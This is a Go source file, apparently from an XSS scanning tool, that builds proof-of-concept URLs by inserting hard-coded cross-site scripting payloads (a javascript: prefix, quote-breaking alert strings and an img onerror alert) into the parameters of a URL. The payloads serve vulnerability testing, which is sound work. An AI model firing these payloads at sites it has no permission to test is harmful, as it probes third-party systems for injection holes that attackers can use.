package dom

import (
	"net/url"
	"strings"

	"github.com/gokitx/pkgs/random"

	"github.com/Buzz2d0/xssfinder/pkg/mix"
)

type VulPoint struct {
	Url    string     `json:"url"`
	Source TrackChain `json:"source"`
	Sink   TrackChain `json:"sink"`
}

type TrackChain struct {
	Label      string `json:"label"`
	Stacktrace []struct {
		Url    string `json:"url"`
		Line   string `json:"line"`
		Column string `json:"column"`
	} `json:"stacktrace"`
}

var (
	fuzzPrefixes = []string{
		`javascript://alert({{RAND}})//`,
	}
	fuzzSuffixes = []string{
		`'-alert({{RAND}})-'`,
		`"-alert({{RAND}})-"`,
		`-alert({{RAND}})-`,
		`'"><img src=x onerror=alert({{RAND}})>`,
		`alert({{RAND}})`,
	}
)

func genRand(s string) (string, string) {
	r := random.RandomDigitString(5)
	return strings.ReplaceAll(s, "{{RAND}}", r), r
}

type FuzzUrl struct {
	Url  string `json:"url"`
	Rand string `json:"rand"`
}

// GenPocUrls generates fuzz urls with payload
func GenPocUrls(point VulPoint) ([]FuzzUrl, error) {
	payloads := make([]FuzzUrl, 0)

	u, err := url.Parse(point.Url)
	if err != nil {
		return nil, err
	}
	var (
		preRand string
		sufRand string
	)
	for index, pre := range fuzzPrefixes {
		pre, preRand = genRand(pre)
		fuzzPrefixes[index] = pre
	}

	for index, suf := range fuzzSuffixes {
		suf, sufRand = genRand(suf)
		fuzzSuffixes[index] = suf
	}
	prefixURLs := mix.Payloads(*u, fuzzPrefixes, []mix.Rule{mix.RuleAppendPrefix, mix.RuleReplace}, mix.DefaultScopes)
	for _, u := range prefixURLs {
		payloads = append(payloads, FuzzUrl{Url: u.String(), Rand: preRand})
	}

	suffixURLs := mix.Payloads(*u, fuzzSuffixes, []mix.Rule{mix.RuleAppendSuffix, mix.RuleReplace}, mix.DefaultScopes)
	for _, u := range suffixURLs {
		payloads = append(payloads, FuzzUrl{Url: u.String(), Rand: sufRand})
	}

	// TODO referrer
	// if strings.Contains(point.Source.Label, "referrer") {
	// 	for _, suf := range fuzzSuffixes {
	// 		u, rand := genRand(fmt.Sprintf("%s&%s", point.Url, suf))
	// 		payloads = append(payloads, FuzzUrl{
	// 			Url:  u,
	// 			Rand: rand,
	// 		})
	// 	}
	// }

	return payloads, nil
}
